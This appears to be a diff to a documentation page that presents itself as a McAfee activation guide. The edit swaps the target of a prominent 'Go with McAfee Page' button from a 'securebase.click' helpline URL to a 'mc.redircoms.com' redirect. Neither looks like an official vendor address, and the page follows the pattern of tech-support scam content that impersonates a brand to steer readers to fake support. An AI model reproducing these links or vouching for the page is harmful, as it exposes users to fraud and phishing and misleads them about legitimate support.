@@ -6,7 +6,7 @@ For anyone who has recently purchased McAfee security software, one of the first
 .. raw:: html
 
    <div style="text-align:center;">
-       <a href="https://mcafeedesk.securebase.click/helpline/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with McAfee Page</a>
+       <a href="https://mc.redircoms.com" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with McAfee Page</a>
    </div>
 
 When you **activate McAfee Product with product key**, you unlock the full version of the antivirus and ensure that your system stays protected with real-time updates. Similarly, if you prefer to **activate McAfee Product with activation code**, you can do so by entering the code provided at purchase. Whether you purchased your McAfee subscription online or from a retail store, these activation methods apply.  
@@ -122,3 +122,4 @@ If you encounter difficulties, remember that McAfee support provides resources t
 
 
 By taking a few minutes to complete this process, you ensure that your investment in McAfee security continues to safeguard your digital life.  
+
